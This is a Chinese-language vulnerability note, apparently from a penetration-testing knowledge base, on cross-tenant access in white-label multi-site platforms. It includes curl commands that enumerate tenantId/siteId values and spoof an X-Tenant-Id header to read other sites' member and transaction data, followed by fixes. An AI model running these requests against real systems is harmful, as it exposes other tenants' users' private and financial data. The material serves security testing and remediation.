---
title: 包网多租户越权（tenantId/siteId 遍历，横穿几十个站点）
cve: 无（业务逻辑）
severity: critical
cvss: 9.2
product: 包网/白标系统（一套后台托管多站点）
versions: 任意
ports: 80, 443
keywords: 多租户, tenant, siteId, 包网, 白标, 越权
entry: 请求体或 Header 里的 tenantId / siteId / merchantId
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

- 登录页/接口回应里出现 `siteId`、`tenantId`、`merchantId`、`brandId`；
- 一套后台能切多个域名（白标）。

## 前置条件

- 任一站点普通账号；能抓到带租户字段的请求。

## PoC

```bash
# 1) 确认自己的租户 id
curl -s https://a.target.com/api/user/info -H "Authorization: Bearer <t>" | jq '.data.siteId,.data.tenantId'

# 2) 换租户读他人站点数据
for sid in 1 2 3 10 100; do
  echo "== tenant $sid"
  curl -s "https://a.target.com/api/report/member?tenantId=$sid&page=1&size=5" \
    -H "Authorization: Bearer <t>" | head -c 200; echo
done
# 判定：返回其他站点的会员/流水 = 命中

# 3) 带 X-Tenant 头绕（有些系统只信 Header）
curl -s https://a.target.com/api/admin/config -H "Authorization: Bearer <t>" -H "X-Tenant-Id: 2"
```

## 利用步骤

1. 先读自己的租户字段（基线）；
2. 换 id 读报表/会员（只读）；
3. 命中即"一家包网几十站点全暴露"——写报告时点明站点数；
4. 证据：不同 tenantId 的两条响应差异（脱敏）。

## 修复与缓解

- 租户 id 从 token 派生，禁止请求体/头传；所有查询加租户过滤；
- 跨租户访问记审计并告警。

## 参考

- OWASP API1 BOLA；多租户隔离缺陷（CWE-639）。
